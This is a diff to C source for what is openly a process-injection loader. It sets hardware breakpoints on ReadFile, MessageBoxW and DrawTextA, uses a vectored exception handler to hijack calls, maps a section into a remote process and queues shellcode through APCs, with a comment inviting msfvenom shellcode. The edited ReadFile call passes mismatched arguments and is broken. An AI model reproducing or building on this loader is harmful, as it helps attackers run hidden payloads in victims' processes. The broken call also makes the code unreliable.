@@ -260,7 +260,7 @@ HANDLE GiveMeMyProcessHandle(WCHAR* ProcessName, OUT int* PID) {
 
 BOOL SettingMap(HANDLE* outSection, BYTE* outRemoteBase, HANDLE hProcess) {
 
-	printf("[i] MessageBoxA hooked successfuly\n");
+	printf("[i] ReadFile hooked successfuly\n");
 
 	// Put your msfvenom shellcode here !
 	uint8_t payload[] = {
@@ -461,7 +461,7 @@ LONG WINAPI VectorHandler(PEXCEPTION_POINTERS pExceptionInfo) {
 				ctx->Rcx = (ULONG_PTR)&hSection;
 				ctx->Rdx = (ULONG_PTR)&pBaseSection;
 				ctx->R8 = (ULONG_PTR)hProcess;
-			
+
 				if (!SettingMap(&hSection, &pBaseSection, hProcess))
 					RETURN_VALUE(ctx, FALSE);
 				else
@@ -644,7 +644,7 @@ int main() {
 	/*
 	Set Hardware BP
 	*/
-	if (!SetHardwareBreakingPnt(MessageBoxA, SettingMap, Dr0) || !SetHardwareBreakingPnt(MessageBoxW, QueueShellcodeAPC, Dr1) || !SetHardwareBreakingPnt(DrawTextA, InjectShellcodeAPCmanually, Dr2)) {
+	if (!SetHardwareBreakingPnt(ReadFile, SettingMap, Dr0) || !SetHardwareBreakingPnt(MessageBoxW, QueueShellcodeAPC, Dr1) || !SetHardwareBreakingPnt(DrawTextA, InjectShellcodeAPCmanually, Dr2)) {
 		printf("Error while Initializing HardwareBP\n");
 		exit(-1);
 	}
@@ -689,7 +689,7 @@ int main() {
 		return -1;
 	}
 
-	MessageBoxA(NULL, "Thanks !", "HIHI", MB_OK);
+	ReadFile(NULL, "Thanks !", "HIHI", MB_OK, NULL);
 	if (pBaseSection != NULL && pBaseSection != 0) {
 		printf("[+] Setup of the map successful at 0x%p\n", pBaseSection);
 	}
